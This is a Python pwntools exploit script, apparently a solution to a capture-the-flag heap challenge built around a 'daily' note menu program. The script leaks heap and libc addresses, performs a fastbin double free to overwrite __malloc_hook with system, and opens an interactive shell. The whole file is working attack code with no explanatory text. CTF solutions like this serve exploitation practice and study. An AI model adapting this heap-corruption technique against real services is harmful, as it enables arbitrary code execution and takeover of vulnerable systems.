from pwn import *

p = process('./pwn')
#p = remote('85c3e0fcae5e972af313488de60e8a5a.kr-lab.com',58512)
elf = ELF('./pwn')
libc = ELF('./libc.so')
context.log_level = 'debug'

def create(size,context):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('Please enter the length of daily:')
    p.sendline(str(size))
    p.recvuntil('Now you can write you daily\n')
    p.send(context)

def show():
    p.sendlineafter('Your choice:','1')

def edit(index,context):
    p.sendlineafter('Your choice:','3')
    p.sendlineafter('Please enter the index of daily:',str(index))
    p.sendafter('Please enter the new daily\n',context)

def delete(index):
    p.sendlineafter('Your choice:','4')
    p.sendlineafter('Please enter the index of daily:',str(index))

#leak heap base
create(0x60,'A')
create(0x60,'A')
create(0x80,'A'*0x20)
create(0x20,'A'*0x20)
delete(1)
delete(0)
create(0x60,'\x10')
show()

gdb.attach(p)
p.recvuntil('0 : ')
data = u64(p.recv(4).ljust(8,'\x00'))-0x10
log.success('heap base :'+hex(data))
idx = (data - 0x602060)/16

#leak libc
edit(0,'A'*8+p64(data+0x70*2+0x10))
delete(idx+1)
show()
p.recvuntil('2 : ')
data2 = u64(p.recv(6).ljust(8,'\x00')) - 3951480
one_addr = data2 + 0xf1147
malloc_hook = data2 + libc.symbols['__malloc_hook']
system_addr = data2 + libc.symbols['system']
log.success('malloc addr:'+hex(malloc_hook))
log.success('libc base :'+hex(data2))

#35
create(0x60,'A')
edit(0,'A'*8+p64(data+0x70+0x10))
delete(idx+1)
delete(0)
delete(1)

#double free 19
create(0x60,p64(malloc_hook-35))
create(0x60,'/bin/sh')
create(0x60,'A')
create(0x60,'\x00'*19+p64(system_addr))
p.sendlineafter('Your choice:','2')
p.recvuntil('Please enter the length of daily:')
p.send(str(data+0x10))
#gdb.attach(p)

p.interactive()
